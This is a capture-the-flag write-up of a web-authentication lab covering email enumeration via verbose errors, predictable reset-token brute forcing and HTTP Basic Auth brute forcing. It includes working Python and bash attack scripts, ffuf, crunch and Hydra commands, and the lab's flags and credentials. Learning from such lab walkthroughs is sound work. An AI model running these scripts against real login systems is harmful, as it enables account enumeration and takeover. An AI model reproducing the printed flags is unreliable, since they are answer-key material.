**Path:** Web Application Pentesting  
**Difficulty:** Intermediate  
**Target:** `enum.thm` (`10.67.156.205`)

---
### Attack Chain Summary
```
Email Enumeration → Predictable Token Brute Force → Basic Auth Brute Force
```

---

### Task 1 — Authentication Enumeration (Verbose Errors)
#### Challenge Question
"Authentication enumeration is a fundamental aspect of security testing, concentrating specifically on the mechanisms that protect sensitive aspects of web applications. Each of these elements is meticulously tested because they represent potential vulnerabilities that, if exploited, could lead to significant security breaches. What type of error messages can unintentionally provide attackers with confirmation of valid usernames?"

#### Answer
Verbose errors

---
### Task 2 — Email Enumeration via Verbose Login Errors
 
#### Challenge Question
"Navigate to http://enum.thm/labs/verbose_login/ and use the provided Python script along with a common email wordlist to enumerate valid email addresses registered in the application. What is the valid email address from the list?"
 
Expected Flag Format: email@gmail.com
 
#### Approach
Download the email wordlist:
```bash
wget https://raw.githubusercontent.com/nyxgeek/username-lists/master/usernames-top100/usernames_gmail.com.txt
```
 
Run the enumeration script:
```bash
python3 script.py usernames_gmail.com.txt
```
 
The script works by sending a login request for each email and checking the error response:
* If the response contains "Email does not exist" → invalid email
* If the response contains anything else → valid email

Script contents:
```python
import requests
import sys
 
def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',
        'function': 'login'
    }
    response = requests.post(url, headers=headers, data=data)
    return response.json()
 
def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"
 
    with open(email_file, 'r') as file:
        emails = file.readlines()
 
    for email in emails:
        email = email.strip()
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)
 
    return valid_emails
 
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)
 
    email_file = sys.argv[1]
    valid_emails = enumerate_emails(email_file)
 
    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
```
 
#### Result
```
[VALID] canderson@gmail.com
```
 
#### Answer
`canderson@gmail.com`
 
#### Key Takeaway
The script exploits the difference in error messages to confirm whether an email is registered. This is a real-world vulnerability found in many web applications. Automating this with a wordlist makes it fast and scalable.
 
---
 
### Task 3 — Predictable Token Brute Force
 
#### Challenge Question
"Navigate to http://enum.thm/labs/predictable_tokens/. The application uses a simple 3-digit numeric token for password resets. Using Burp Suite Intruder or an alternative tool, brute force the reset token for admin@admin.com and retrieve the flag from the dashboard."
 
Expected Flag Format: THM{flag}
 
#### Approach
 The application generates a reset token using:
```php
$token = mt_rand(100, 200);
```
 
This is a 3-digit number between 100-200 — easily brute forceable.
 
Generate the token wordlist with Crunch:
```bash
crunch 3 3 -o otp.txt -t %%% -s 100 -e 200
```
 
Submit the password reset for `admin@admin.com` then immediately brute force the token with ffuf:
```bash
ffuf -u "http://enum.thm/labs/predictable_tokens/reset_password.php?token=FUZZ" -w otp.txt -fs 730
```
 
**Problem encountered:** The token expired within seconds, making it impossible to manually visit the URL after ffuf found it.
 
**Solution:** A custom bash script that submits the reset AND brute forces simultaneously:
 
```bash
#!/bin/bash
# Usage: ./predictable_token_exploit.sh <target_ip>
curl -s -o /dev/null -X POST "http://$1/labs/predictable_tokens/index.php" -d "email=admin@admin.com"
for i in $(seq 100 200); do
    response=$(curl -s "http://$1/labs/predictable_tokens/reset_password.php?token=$i")
    if echo "$response" | grep -v "Invalid token" | grep -q "password\|flag\|THM"; then
        echo "Valid token: $i"
        echo "$response"
        break
    fi
done
```
 
Run the script:
```bash
chmod +x predictable_token_exploit.sh
./predictable_token_exploit.sh MACHINE_IP
```
 
Output:
```
Valid token: 198
Your new password is: SG0rfZLj
Email: admin@admin.com
```
 
Log in at `http://enum.thm/labs/predictable_tokens/` with `admin@admin.com` / `SG0rfZLj`
 
#### Flag
 `THM{50_pr3d1ct4BL333!!}`
 
#### Key Takeaway
 Predictable tokens are a critical vulnerability. Using `mt_rand()` with a small range makes tokens brute force able. A custom bash script was more effective than Burp Suite Community Edition due to speed limitations in the free version.
 
---
 
### Task 4 — Basic Authentication Brute Force
 
#### Challenge Question
"Navigate to http://enum.thm/labs/basic_auth/. The page is protected by HTTP Basic Authentication. Using Hydra, brute force the credentials and retrieve the flag."
 
Expected Flag Format: THM{flag}
 
#### Approach
 
Download the password wordlist:
```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt
```
 
Run Hydra with the `http-get` module for Basic Auth:
```bash
hydra -l admin -P 500-worst-passwords.txt MACHINE_IP http-get /labs/basic_auth/
```
 
Result:
```
[80][http-get] host: MACHINE_IP   login: admin   password: yellow
```
 
Log in at `http://enum.thm/labs/basic_auth/` with `admin` / `yellow`
 
#### Flag
`THM{b4$$1C_AuTTHHH}`
 
#### Key Takeaway
 Basic Authentication sends credentials as a base64-encoded string in the Authorization header. Since base64 is not encryption, credentials are trivially decoded. Weak passwords make Basic Auth particularly vulnerable to brute force. Always use strong passwords and HTTPS when implementing Basic Auth.
 
---
 
## Tools Used
 
| Tool | Purpose |
|------|---------|
| `python3` | Email enumeration via verbose errors |
| `ffuf` | Fast token brute forcing |
| `crunch` | Generating numeric token wordlist |
| `hydra` | Basic Auth brute forcing |
| Custom bash script | Automated reset + token brute force in one shot |
 
---
 
## Lessons Learned
 
* **Verbose errors are a a jackpot .** Different error messages for invalid email vs wrong password confirm account existence.
* **Simple tokens are dangerous.** A 3-digit numeric token can be brute forced in seconds.
* **Automate when tools fail.** When Burp Community Edition was too slow, a custom bash script solved the problem faster.
* **Basic Auth is not secure over HTTP.** Credentials are only base64 encoded — not encrypted.
* **Hydra is versatile.** The `http-get` module handles Basic Auth just like `http-post-form` handles login forms.
